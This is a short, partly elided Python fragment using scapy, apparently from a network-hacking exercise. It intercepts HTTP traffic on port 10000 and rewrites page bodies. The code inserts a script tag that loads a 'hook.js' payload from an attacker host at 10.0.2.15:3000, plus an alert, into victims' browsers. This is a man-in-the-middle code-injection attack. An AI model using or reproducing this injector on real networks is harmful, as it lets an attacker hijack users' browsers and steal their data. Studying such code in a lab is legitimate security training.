...
def process_packet(packet):
    ...
    if scapy_packet.haslayer(scapy.Raw):
        try:
            ...
            if scapy_packet[scapy.TCP].dport == 10000:  #to use scapy to check for HTTP requests and responses, check the TCP-layer -this layer contains sport (=source-port) and dport (=destination-port); if the sport is an HTTP-port, then the package contains an HTTP-response
                print("[+] Request")
                ...
                if "<body>\n" in load:
                    replce = "<body>\n"
                    replce_with = '<script src="http://10.0.2.15:3000/hook.js"></script><script>alert("Injecting...");</script><body>\n'
